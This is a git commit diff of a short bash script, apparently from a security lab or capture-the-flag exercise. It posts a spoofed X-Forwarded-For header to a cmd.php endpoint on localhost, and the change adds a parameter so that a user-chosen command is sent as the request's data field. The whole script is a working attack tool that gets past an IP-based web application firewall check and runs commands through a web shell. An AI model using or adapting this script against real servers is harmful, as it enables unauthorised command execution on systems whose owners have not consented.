3cac8f14e0e681e5958711ef8deb07f74d7523a9
$_TYLER <tlb1986@sbcglobal.net>
2019-02-09 00:09:53 -0600

    Update waf_x-forwarded-for_cmd.sh

--- waf_x-forwarded-for_cmd.sh
+++ waf_x-forwarded-for_cmd.sh
@@ -1,11 +1,12 @@
 #!/bin/bash
 
 HOST=$1
+CMD=$2 
 if [[ $# -eq 0 ]];
 then
-	echo "Usage: ./$0 <host to spoof>"
+	echo "Usage: ./$0 <host to spoof> <cmd>"
 	exit
 fi
 
 
-curl -X POST -H "X-Forwarded-For: ${HOST}" --data "data=${1}" http://127.0.0.1:10080/cmd.php
+curl -X POST -H "X-Forwarded-For: ${HOST}" --data "data=${CMD}" http://127.0.0.1:10080/cmd.php
